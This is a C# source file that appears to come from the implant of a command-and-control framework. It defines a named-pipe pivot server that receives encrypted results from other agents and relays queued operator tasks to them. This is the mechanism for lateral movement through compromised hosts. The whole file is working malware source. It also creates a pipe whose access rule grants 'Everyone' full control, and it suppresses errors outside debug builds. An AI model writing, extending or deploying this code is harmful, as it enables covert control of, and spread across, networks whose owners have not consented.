using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Helpers;
using Agent.Models;

namespace Agent.Service.Pivoting
{
    public class PivotPipeServer : PivotServer
    {

        public PivotPipeServer(ConnexionUrl conn, string serverKey) : base(conn, serverKey)
        {
        }

        protected PipeSecurity CreatePipeSecurityForEveryone()
        {
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
            return pipeSecurity;
        }


        public override async Task Start()
        {
            this.Status = RunningService.RunningStatus.Running;

            while (!this._tokenSource.IsCancellationRequested)
            {
                try
                {
                    using (NamedPipeServerStream server = new NamedPipeServerStream(this.Connexion.PipeName, PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 512, 512, CreatePipeSecurityForEveryone(), HandleInheritability.None))
                    {
                        Task connectionTask = Task.Factory.FromAsync(server.BeginWaitForConnection, server.EndWaitForConnection, null);
                        await connectionTask;

                        HandleClient(server);

                        var reader = new StreamReader(server); //ack end oth message
                        reader.ReadLine();

                        if (server.IsConnected)
                            server.Disconnect();
                    }
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }
            }

            this.Status = RunningService.RunningStatus.Stoped;
        }


        private void HandleClient(NamedPipeServerStream client)
        {
            var req = client.ReceivedMessage();
            var dec = this.Encryptor.Decrypt(req);
            var responses = dec.Deserialize<List<MessageResult>>();
            _messageService.EnqueueResults(responses);

            var relays = this.ExtractRelays(responses);

            Debug.WriteLine($"Pipe Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
            var tasks = this._messageService.GetMessageTasksToRelay(relays);
            var ser = tasks.Serialize();
            client.SendMessage(this.Encryptor.Encrypt(ser));
        }


    }
}
